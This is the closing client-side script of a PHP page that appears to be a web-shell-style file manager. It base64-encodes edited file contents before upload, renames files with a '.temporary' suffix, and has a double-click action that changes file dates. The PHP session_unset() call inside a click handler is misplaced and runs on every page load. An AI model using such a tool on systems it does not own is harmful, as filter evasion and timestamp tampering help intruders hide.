                localStorage.setItem('color-theme', 'light');

                themeToggleDarkIcon.classList.remove('hidden');
                themeToggleLightIcon.classList.add('hidden');

                lightText.classList.add('hidden');
                darkText.classList.remove('hidden');
            } else {
                document.documentElement.classList.add('dark');
                localStorage.setItem('color-theme', 'dark');

                themeToggleLightIcon.classList.remove('hidden');
                themeToggleDarkIcon.classList.add('hidden');

                lightText.classList.remove('hidden');
                darkText.classList.add('hidden');
            }
        });

        const edit_form = document.getElementById('handle_file');
        if (edit_form) {
            edit_form.addEventListener('submit', async (e) => {
                const filename = edit_form.querySelector('[type="text"]');
                const textarea = edit_form.querySelector('textarea');

                if (filename) {
                    filename.value = filename.value + ".temporary";
                }

                textarea.value = await largeBase64Encode(textarea.value);
            });
        }

        async function largeBase64Encode(str) {
            const utf8 = new TextEncoder().encode(str);
            let binary = '';
            const chunkSize = 0x8000;
            for (let i = 0; i < utf8.length; i += chunkSize) {
                const chunk = utf8.subarray(i, i + chunkSize);
                binary += String.fromCharCode.apply(null, chunk);
            }
            return btoa(binary);
        }

        const closeToast = document.querySelector('[data-dismiss-target="#toast-default"]');
        if (closeToast) {
            closeToast.addEventListener('click', () => {
                const toast = document.getElementById('toast-default');
                if (toast) {
                    toast.classList.add('hidden');
                    <?php
                    session_unset();
                    ?>
                }
            });
        }

        const toolsBtn = document.getElementById('showTools');
        const toolsDisplay = document.getElementById('toolsDisplay');

        toolsBtn.addEventListener('click', function() {
            toolsDisplay.classList.toggle('hidden');
        });

        function copyToClipboard() {
            const copyText = document.getElementById('copyTarget').textContent;
            const copyButton = document.getElementById('copyBtn');
            navigator.clipboard.writeText(copyText).then(() => {
                copyButton.textContent = 'COPIED!';
                setTimeout(() => {
                    copyButton.textContent = 'COPY TO CLIPBOARD';
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }

        function showInfo() {
            const infoBox = document.getElementById('infoMethod');
            infoBox.classList.toggle('hidden');
        }

        const dateElements = document.querySelectorAll('#chdate');
        dateElements.forEach(el => {
            const itemPath = el.getAttribute('data-item-path');
            el.addEventListener('dblclick', () => {
                window.location.href = `?path=<?= $path ?>&item=${itemPath}&action=changedate<?= $toPage ?>`;
            });

        });

        function postDownload(path) {
            const form = document.createElement('form');
            form.method = 'post';

            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'download';
            input.value = btoa(path);

            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/flowbite@3.1.2/dist/flowbite.min.js"></script>
</body>

</html>

<?php
ob_end_flush();
?>
